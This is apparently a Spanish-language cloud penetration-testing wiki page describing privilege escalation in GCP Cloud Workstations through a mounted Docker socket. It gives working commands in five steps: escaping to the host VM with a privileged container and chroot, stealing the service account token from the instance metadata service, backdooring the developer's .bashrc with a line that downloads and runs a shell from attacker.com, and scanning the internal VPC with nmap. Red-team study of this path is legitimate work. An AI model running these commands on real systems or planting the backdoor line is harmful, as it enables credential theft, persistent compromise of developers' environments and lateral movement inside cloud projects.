# GCP - Cloud Workstations Privesc


### Escalada desde el contenedor vía Docker Socket (Container -> VM -> Project)

La principal ruta de escalada de privilegios en Cloud Workstations proviene del requisito de soportar flujos de trabajo **Docker-in-Docker (DinD)** para desarrolladores. Cuando la configuración de la workstation monta el Docker socket o permite contenedores privilegiados (una configuración común), un atacante dentro del contenedor de la workstation puede escapar hacia la Compute Engine VM subyacente y robar su service account token.

**Prerequisitos:**
- Acceso a un terminal de Cloud Workstation (vía SSH, sesión comprometida o credenciales robadas)
- La configuración de la workstation debe montar `/var/run/docker.sock` o habilitar contenedores privilegiados

**Contexto de arquitectura:** La workstation es un contenedor (Layer 3) que se ejecuta sobre un runtime Docker/Containerd (Layer 2) en una GCE VM (Layer 1). El Docker socket proporciona acceso directo al runtime de contenedores del host.

> [!NOTE]
> La herramienta [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript) automatiza la evasión completa del contenedor y te proporciona un shell root en la VM host.

<details>

<summary>Paso 1: Comprobar Docker socket</summary>
```bash
# Verify the Docker socket is available
ls -l /var/run/docker.sock
# Expected output: srw-rw---- 1 root docker 0 ...
```
</details>

<details>

<summary>Paso 2: Escapar al sistema de archivos de la VM host</summary>

Iniciamos un privileged container, montando el directorio raíz del host en `/mnt/host`. También compartimos la host's network y el PID namespace para maximizar la visibilidad.
```bash
# Spawn a privileged container mounting the host's root filesystem
docker run -it --rm --privileged --net=host --pid=host \
-v /:/mnt/host \
alpine sh

# Inside the new container, chroot into the host
chroot /mnt/host /bin/bash
```
Ahora tienes un **root shell on the underlying Compute Engine VM** (Capa 1).

</details>

<details>

<summary>Paso 3: Steal the VM service account token from IMDS</summary>
```bash
# From the host VM, query the Instance Metadata Service
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Check which service account is attached
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Check scopes (CRITICAL STEP)
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
```
</details>

> [!CAUTION]
> **¡Comprueba los scopes!**
> Incluso si la cuenta de servicio adjunta es **Editor**, la VM podría estar restringida por los scopes de acceso.
> Si ves `https://www.googleapis.com/auth/cloud-platform`, tienes acceso completo.
> Si solo ves `logging.write` y `monitoring.write`, estás limitado a los vectores de **Network Pivot** y **Persistence** a continuación.

<details>

<summary>Paso 4: Achieve Persistence (Backdoor the User)</summary>

Cloud Workstations montan un disco persistente en `/home/user`. Debido a que el usuario del contenedor (normalmente `user`, UID 1000) coincide con el usuario del host (UID 1000), puedes escribir en el directorio home del host. Esto te permite backdoor the environment incluso si el workstation container es reconstruido.
```bash
# Check if you can write to the host's persistent home
ls -la /mnt/host/home/user/

# Drop a backdoor that executes next time the developer logs in
# Note: Do this from the container escape context
echo "curl http://attacker.com/shell | bash" >> /mnt/host/home/user/.bashrc
```
</details>

<details>

<summary>Paso 5: Network Pivot (Internal VPC Access)</summary>

Como compartes el namespace de red del host (`--net=host`), ahora eres un nodo de confianza en la VPC. Puedes realizar un scan de servicios internos que permitan acceso basado en IP whitelisting.
```bash
# Install scanning tools on the host (if internet access allows)
apk add nmap

# Scan the internal VPC subnet
nmap -sS -p 80,443,22 10.0.0.0/8
```
</details>
